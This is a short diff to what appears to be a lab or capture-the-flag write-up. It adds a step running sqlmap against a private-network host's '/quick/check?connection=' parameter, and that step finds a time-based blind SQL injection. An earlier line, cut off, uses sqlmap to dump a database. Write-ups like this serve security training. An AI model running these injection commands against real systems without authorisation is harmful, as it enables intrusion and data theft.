@@ -6,6 +6,6 @@ We then run `sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch -D ele
 
 <img width="1929" height="718" alt="image" src="https://github.com/user-attachments/assets/baf08b30-b3ce-4880-938e-c4e4284db678" />
 
+We also know that `/quick/check?connection=` should be vulnerable as well. We can run `sqlmap -u "http://192.168.77.80/quick/check?connection=1" --batch --level=2` which turns up a time-based blind injection.
 
-<img width="1915" height="727" alt="image" src="https://github.com/user-attachments/assets/4a790740-73e4-45ef-aae6-c8fe640aaf6d" />
-
+<img width="1025" height="143" alt="image" src="https://github.com/user-attachments/assets/6ea60c69-4719-4884-b84e-220d03274019" />
